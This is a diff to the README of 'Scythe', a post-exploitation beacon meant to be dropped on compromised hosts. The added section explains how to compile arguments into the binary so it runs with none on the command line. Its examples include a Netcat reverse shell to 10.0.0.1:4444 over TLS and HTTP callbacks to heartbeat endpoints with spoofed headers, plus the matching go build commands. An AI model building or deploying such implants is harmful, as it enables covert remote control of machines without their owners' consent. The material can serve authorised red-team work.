@@ -6,6 +6,58 @@ All in one beacon to drop on a compromised host
 
 * Please look at github actions or just use the dockerfile to build for your platform.
 
+### Embedded arguments
+
+You can compile subcommand and flags into the binary so it runs with **no command-line arguments** (e.g. `./Scythe.embedded` only). The same tokens are used as after the program name today: a JSON array of strings.
+
+**Using the helper script** (from the repo root):
+
+```bash
+./scripts/build-embedded.sh '["Http","-url","https://example.com/api","-timeout","30s"]' ./Scythe.embedded
+./scripts/build-embedded.sh '["Netcat","-reverse","-address","10.0.0.1","-port","4444","-tls"]'
+```
+
+Default output is `./Scythe.embedded` if you omit the second argument.
+
+**Generating JSON safely (recommended for real invocations):** hand-written JSON breaks easily when `-headers` or other values contain commas, spaces, or quotes. Build the same token list you would pass on the CLI, serialize with Python, then pass the result to the script (the script base64-encodes it for `-ldflags`; you do not need to run `base64` yourself).
+
+One-liner (short example):
+
+```bash
+JSON=$(python3 -c 'import json; print(json.dumps(["Http","-timeout","5s","-url","http://127.0.0.1:8080","-headers","Content-Type:application/json,X-Client-Id:abc"]))'
+./scripts/build-embedded.sh "$JSON" ./Scythe.embedded
+```
+
+Long values (e.g. full `User-Agent`, multiple headers): use a small heredoc so the strings stay readable:
+
+```bash
+JSON=$(python3 <<'PY'
+import json
+print(json.dumps([
+    "Http",
+    "-timeout", "5s",
+    "-url", "http://10.0.0.1:8080",
+    "-directories", "/heartbeat,/heartbeat/uuid-here",
+    "-headers",
+    "Content-Type:application/json,X-Client-Id:...,X-API-Secret:...,User-Agent:Mozilla/5.0 ...",
+]))
+PY
+)
+./scripts/build-embedded.sh "$JSON" ./Scythe.embedded
+```
+
+**Manual `go build`:** take the same `JSON` variable as above, then base64 (no newlines) and link:
+
+```bash
+JSON=$(python3 -c 'import json; print(json.dumps(["Http","-url","https://example.com","-timeout","30s"]))')
+B64=$(printf '%s' "$JSON" | base64 | tr -d '\n')
+go build -trimpath \
+  -ldflags "-X github.com/BuildAndDestroy/Scythe/pkg/userinput.EmbeddedArgv=${B64}" \
+  -o Scythe.embedded ./cmd
+```
+
+**Runtime:** run the binary with no extra arguments to use the embedded argv. If you invoke it with any arguments (e.g. `./Scythe.embedded Http -url …`), those are used instead and embedded defaults are ignored.
+
 ## Netcat
 
 Remember to use --proxy if you plan to pivot between hosts
